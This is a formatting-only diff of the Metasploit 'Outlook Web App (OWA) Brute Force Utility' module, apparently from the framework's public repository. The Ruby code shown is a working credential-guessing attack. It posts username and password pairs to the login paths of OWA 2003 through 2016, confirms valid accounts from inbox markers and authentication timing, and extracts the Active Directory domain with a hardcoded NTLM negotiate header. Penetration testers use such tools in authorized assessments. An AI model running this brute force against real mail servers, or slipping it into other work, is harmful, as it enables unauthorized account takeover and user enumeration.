@@ -3,81 +3,77 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
-
   def initialize
     super(
-      'Name'           => 'Outlook Web App (OWA) Brute Force Utility',
-      'Description'    => %q{
+      'Name' => 'Outlook Web App (OWA) Brute Force Utility',
+      'Description' => %q{
         This module tests credentials on OWA 2003, 2007, 2010, 2013, and 2016 servers.
       },
-      'Author'         =>
+      'Author' => [
+        'Vitor Moreira',
+        'Spencer McIntyre',
+        'SecureState R&D Team',
+        'sinn3r',
+        'Brandon Knight',
+        'Pete (Bokojan) Arzamendi', # Outlook 2013 updates
+        'Nate Power', # HTTP timing option
+        'Chapman (R3naissance) Schleiss', # Save username in creds if response is less
+        'Andrew Smith' # valid creds, no mailbox
+      ],
+      'License' => MSF_LICENSE,
+      'Actions' => [
         [
-          'Vitor Moreira',
-          'Spencer McIntyre',
-          'SecureState R&D Team',
-          'sinn3r',
-          'Brandon Knight',
-          'Pete (Bokojan) Arzamendi', # Outlook 2013 updates
-          'Nate Power',                # HTTP timing option
-          'Chapman (R3naissance) Schleiss', # Save username in creds if response is less
-          'Andrew Smith' # valid creds, no mailbox
+          'OWA_2003',
+          {
+            'Description' => 'OWA version 2003',
+            'AuthPath' => '/exchweb/bin/auth/owaauth.dll',
+            'InboxPath' => '/exchange/',
+            'InboxCheck' => /Inbox/
+          }
         ],
-      'License'        => MSF_LICENSE,
-      'Actions'        =>
         [
-          [
-            'OWA_2003',
-            {
-              'Description' => 'OWA version 2003',
-              'AuthPath'    => '/exchweb/bin/auth/owaauth.dll',
-              'InboxPath'   => '/exchange/',
-              'InboxCheck'  => /Inbox/
-            }
-          ],
-          [
-            'OWA_2007',
-            {
-              'Description' => 'OWA version 2007',
-              'AuthPath'    => '/owa/auth/owaauth.dll',
-              'InboxPath'   => '/owa/',
-              'InboxCheck'  => /addrbook.gif/
-            }
-          ],
-          [
-            'OWA_2010',
-            {
-              'Description' => 'OWA version 2010',
-              'AuthPath'    => '/owa/auth.owa',
-              'InboxPath'   => '/owa/',
-              'InboxCheck'  => /Inbox|location(\x20*)=(\x20*)"\\\/(\w+)\\\/logoff\.owa|A mailbox couldn\'t be found|\<a .+onclick="return JumpTo\('logoff\.aspx.+\">/
-            }
-          ],
-          [
-            'OWA_2013',
-            {
-              'Description' => 'OWA version 2013',
-              'AuthPath'    => '/owa/auth.owa',
-              'InboxPath'   => '/owa/',
-              'InboxCheck'  => /Inbox|logoff\.owa/
-            }
-          ],
-          [
-            'OWA_2016',
-            {
-              'Description' => 'OWA version 2016',
-              'AuthPath'    => '/owa/auth.owa',
-              'InboxPath'   => '/owa/',
-              'InboxCheck'  => /Inbox|logoff\.owa/
-            }
-          ]
+          'OWA_2007',
+          {
+            'Description' => 'OWA version 2007',
+            'AuthPath' => '/owa/auth/owaauth.dll',
+            'InboxPath' => '/owa/',
+            'InboxCheck' => /addrbook.gif/
+          }
         ],
+        [
+          'OWA_2010',
+          {
+            'Description' => 'OWA version 2010',
+            'AuthPath' => '/owa/auth.owa',
+            'InboxPath' => '/owa/',
+            'InboxCheck' => /Inbox|location(\x20*)=(\x20*)"\\\/(\w+)\\\/logoff\.owa|A mailbox couldn\'t be found|\<a .+onclick="return JumpTo\('logoff\.aspx.+\">/
+          }
+        ],
+        [
+          'OWA_2013',
+          {
+            'Description' => 'OWA version 2013',
+            'AuthPath' => '/owa/auth.owa',
+            'InboxPath' => '/owa/',
+            'InboxCheck' => /Inbox|logoff\.owa/
+          }
+        ],
+        [
+          'OWA_2016',
+          {
+            'Description' => 'OWA version 2016',
+            'AuthPath' => '/owa/auth.owa',
+            'InboxPath' => '/owa/',
+            'InboxCheck' => /Inbox|logoff\.owa/
+          }
+        ]
+      ],
       'DefaultAction' => 'OWA_2013',
       'DefaultOptions' => {
         'SSL' => true
@@ -90,14 +86,15 @@ class MetasploitModule < Msf::Auxiliary
         OptAddress.new('RHOST', [ true, "The target address" ]),
         OptBool.new('ENUM_DOMAIN', [ true, "Automatically enumerate AD domain using NTLM authentication", true]),
         OptBool.new('AUTH_TIME', [ false, "Check HTTP authentication response time", true])
-      ])
-
+      ]
+    )
 
     register_advanced_options(
       [
         OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", '']),
         OptFloat.new('BaselineAuthTime', [ false, "Baseline HTTP authentication response time for invalid users", 1.0])
-      ])
+      ]
+    )
 
     deregister_options('BLANK_PASSWORDS', 'RHOSTS')
   end
@@ -118,8 +115,8 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("#{msg} Testing version #{action.name}")
 
-    auth_path   = action.opts['AuthPath']
-    inbox_path  = action.opts['InboxPath']
+    auth_path = action.opts['AuthPath']
+    inbox_path = action.opts['InboxPath']
     login_check = action.opts['InboxCheck']
 
     domain = nil
@@ -135,6 +132,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       each_user_pass do |user, pass|
         next if (user.blank? or pass.blank?)
+
         vprint_status("#{msg} Trying #{user} : #{pass}")
         try_user_pass({
           user: user,
@@ -187,11 +185,11 @@ class MetasploitModule < Msf::Auxiliary
       baseline = datastore['BaselineAuthTime'] || 1.0
 
       res = send_request_cgi({
-        'encode'   => true,
-        'uri'      => auth_path,
-        'method'   => 'POST',
-        'headers'  => headers,
-        'data'     => data
+        'encode' => true,
+        'uri' => auth_path,
+        'method' => 'POST',
+        'headers' => headers,
+        'data' => data
       })
 
       if datastore['AUTH_TIME']
@@ -212,8 +210,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if !["OWA_2013", "OWA_2016"].include?(action.name) && res.get_cookies.empty?
-        print_error("#{msg} Received invalid response due to a missing cookie (possibly due to invalid version), aborting")
-        return :abort
+      print_error("#{msg} Received invalid response due to a missing cookie (possibly due to invalid version), aborting")
+      return :abort
     end
     if ["OWA_2013", "OWA_2016"].include?(action.name)
       # Check for a response code to make sure login was valid. Changes from 2010 to 2013 / 2016
@@ -271,7 +269,7 @@ class MetasploitModule < Msf::Auxiliary
         end
       end
     else
-       # The authentication info is in the cookies on this response
+      # The authentication info is in the cookies on this response
       cookies = res.get_cookies
       cookie_header = 'PBack=0'
       %w(sessionid cadata).each do |necessary_cookie|
@@ -287,9 +285,9 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_cgi({
-        'uri'       => inbox_path,
-        'method'    => 'GET',
-        'headers'   => headers
+        'uri' => inbox_path,
+        'method' => 'GET',
+        'headers' => headers
       }, 20)
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
       print_error("#{msg} HTTP Connection Failed, Aborting")
@@ -349,24 +347,26 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_ad_domain
-    urls = ['aspnet_client',
+    urls = [
+      'aspnet_client',
       'Autodiscover',
       'ecp',
       'EWS',
       'Microsoft-Server-ActiveSync',
       'OAB',
       'PowerShell',
-      'Rpc']
+      'Rpc'
+    ]
 
     domain = nil
 
     urls.each do |url|
       begin
         res = send_request_cgi({
-          'encode'   => true,
-          'uri'      => "/#{url}",
-          'method'   => 'GET',
-          'headers'  =>  {'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='}
+          'encode' => true,
+          'uri' => "/#{url}",
+          'method' => 'GET',
+          'headers' => { 'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==' }
         })
       rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
         vprint_error("#{msg} HTTP Connection Failed")
@@ -380,7 +380,7 @@ class MetasploitModule < Msf::Auxiliary
 
       if res && res.code == 401 && res.headers.has_key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i)
         hash = res['WWW-Authenticate'].split('NTLM ')[1]
-        domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
+        domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/, '')
         print_good("Found target domain: #{domain}")
         return domain
       end
